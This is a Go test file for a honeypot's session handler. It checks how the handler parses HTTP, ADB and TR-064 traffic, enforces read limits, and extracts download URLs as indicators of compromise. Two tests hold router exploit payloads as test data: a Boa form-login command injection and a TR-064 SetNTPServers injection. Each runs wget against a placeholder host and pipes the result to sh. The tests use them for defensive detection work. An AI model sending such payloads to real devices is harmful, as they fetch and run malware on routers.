package session

import (
	"context"
	"net"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/generalregulator/botbait/internal/config"
	"github.com/generalregulator/botbait/internal/ioc"
	"github.com/generalregulator/botbait/internal/metrics"
	"github.com/generalregulator/botbait/internal/model"
	"github.com/generalregulator/botbait/internal/parser"
)

type captureSink chan *model.Event

func (c captureSink) Submit(ev *model.Event) { c <- ev }

func testCfg() *config.Config {
	return &config.Config{
		ReadTimeout: 300 * time.Millisecond, WriteTimeout: time.Second,
		SessionTimeout: 2 * time.Second, MaxReadBytes: 64 * 1024,
		TelnetPorts: []int{2323},
	}
}

func runSession(t *testing.T, cfg *config.Config, port int, script func(c net.Conn)) *model.Event {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	sink := make(captureSink, 1)
	h := New(cfg, sink, &metrics.Metrics{})
	go func() {
		c, err := ln.Accept()
		if err == nil {
			h.Handle(context.Background(), c, port)
		}
	}()
	cl, err := net.Dial("tcp", ln.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	defer cl.Close()
	script(cl)
	select {
	case ev := <-sink:
		return ev
	case <-time.After(5 * time.Second):
		t.Fatal("session never finished")
		return nil
	}
}

func TestHTTPLyingContentLengthKeepsIOCsIntact(t *testing.T) {
	body := "username=a&psw=$(wget http://198.51.100.9/a.sh -O- | sh)"
	req := "POST /boaform/admin/formLogin HTTP/1.1\r\nHost: x\r\nContent-Length: 10\r\n\r\n" + body
	ev := runSession(t, testCfg(), 7547, func(c net.Conn) {
		c.Write([]byte(req))
		c.SetReadDeadline(time.Now().Add(time.Second))
		c.Read(make([]byte, 512))
	})
	if ev.Protocol != "HTTP" || ev.HTTPMethod != "POST" || ev.HTTPPath != "/boaform/admin/formLogin" {
		t.Fatalf("bad structured fields: %+v", ev)
	}
	r := ioc.Extract(ioc.Normalize(ev.Text))
	if len(r.DownloadURLs) != 1 || r.DownloadURLs[0] != "http://198.51.100.9/a.sh" {
		t.Fatalf("URL fragmented or lost: urls=%v text=%q", r.URLs, ev.Text)
	}
}

func TestHTTPGarbageAfterBodyIsNotAnotherRequest(t *testing.T) {
	ev := runSession(t, testCfg(), 7547, func(c net.Conn) {
		c.Write([]byte("GET / HTTP/1.1\r\nHost: x\r\n\r\n9/a.sh -O- | sh)"))
		c.SetReadDeadline(time.Now().Add(time.Second))
		c.Read(make([]byte, 512))
	})
	if ev.HTTPMethod != "GET" || ev.Action != "HTTP GET" {
		t.Fatalf("leftover bytes were treated as a request: %+v", ev)
	}
}

func TestADBShellCapturedAndAnswered(t *testing.T) {
	var reply []byte
	ev := runSession(t, testCfg(), 5555, func(c net.Conn) {
		c.Write(parser.BuildADB("CNXN", 0x01000000, 4096, []byte("host::\x00")))
		c.Write(parser.BuildADB("OPEN", 7, 0, []byte("shell:echo hello\x00")))
		c.SetReadDeadline(time.Now().Add(time.Second))
		buf := make([]byte, 4096)
		for len(reply) < 200 {
			n, err := c.Read(buf)
			reply = append(reply, buf[:n]...)
			if err != nil {
				break
			}
		}
	})
	msgs, _, err := parser.ParseADB(reply, 65536)
	if err != nil || len(msgs) < 4 {
		t.Fatalf("bad ADB replies: n=%d err=%v", len(msgs), err)
	}
	want := []string{"CNXN", "OKAY", "WRTE", "CLSE"}
	for i, w := range want {
		if msgs[i].Command != w {
			t.Fatalf("reply %d = %s, want %s", i, msgs[i].Command, w)
		}
	}

	if string(msgs[2].Payload) != "hello\r\n" || msgs[1].Arg1 != 7 {
		t.Fatalf("WRTE/OKAY content wrong: %q arg1=%d", msgs[2].Payload, msgs[1].Arg1)
	}
	if ev.Action != "ADB shell" || len(ev.Commands) != 1 || ev.Commands[0] != "echo hello" {
		t.Fatalf("event wrong: %+v", ev)
	}
}

func TestOversizeInputIsBounded(t *testing.T) {
	cfg := testCfg()
	cfg.MaxReadBytes = 4096
	ev := runSession(t, cfg, 5555, func(c net.Conn) {
		c.Write([]byte("POST /x HTTP/1.1\r\nContent-Length: 99999999\r\n\r\n" + strings.Repeat("A", 20000)))
		c.SetReadDeadline(time.Now().Add(3 * time.Second))
		c.Read(make([]byte, 16))
	})
	if ev.BytesReceived > cfg.MaxReadBytes || !ev.Truncated {
		t.Fatalf("read budget not enforced: received=%d truncated=%v", ev.BytesReceived, ev.Truncated)
	}
	if len(ev.Text) > cfg.MaxReadBytes {
		t.Fatalf("analysis text unbounded: %d", len(ev.Text))
	}
}

func TestConnectOnlyScan(t *testing.T) {
	ev := runSession(t, testCfg(), 7547, func(c net.Conn) { time.Sleep(450 * time.Millisecond) })
	if ev.Action != "Connect only (no data)" || ev.BytesReceived != 0 {
		t.Fatalf("got %+v", ev)
	}
}

func TestTR064ExploitOnPort7547(t *testing.T) {
	body := "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body>" +
		"<u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\"><NewNTPServer1>`cd /tmp;wget http://203.0.113.50/mips.sh;sh mips.sh`</NewNTPServer1>" +
		"</u:SetNTPServers></s:Body></s:Envelope>"
	req := "POST /UD/act?1 HTTP/1.1\r\nHost: 192.0.2.10:7547\r\nUser-Agent: Hello-World\r\n" +
		"SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\nContent-Type: text/xml\r\n" +
		"Content-Length: " + strconv.Itoa(len(body)) + "\r\n\r\n" + body
	var reply []byte
	ev := runSession(t, testCfg(), 7547, func(c net.Conn) {
		c.Write([]byte(req))
		c.SetReadDeadline(time.Now().Add(time.Second))
		buf := make([]byte, 2048)
		n, _ := c.Read(buf)
		reply = buf[:n]
	})
	if !strings.HasPrefix(string(reply), "HTTP/1.1 200 OK") {
		t.Fatalf("reply: %q", reply)
	}
	if ev.Service() != "7547/HTTP" || ev.HTTPPath != "/UD/act?1" {
		t.Fatalf("event: service=%s path=%s", ev.Service(), ev.HTTPPath)
	}
	r := ioc.Extract(ioc.Normalize(ev.Text))
	if len(r.DownloadURLs) != 1 || r.DownloadURLs[0] != "http://203.0.113.50/mips.sh" {
		t.Fatalf("download URL: %v (urls=%v)", r.DownloadURLs, r.URLs)
	}
}
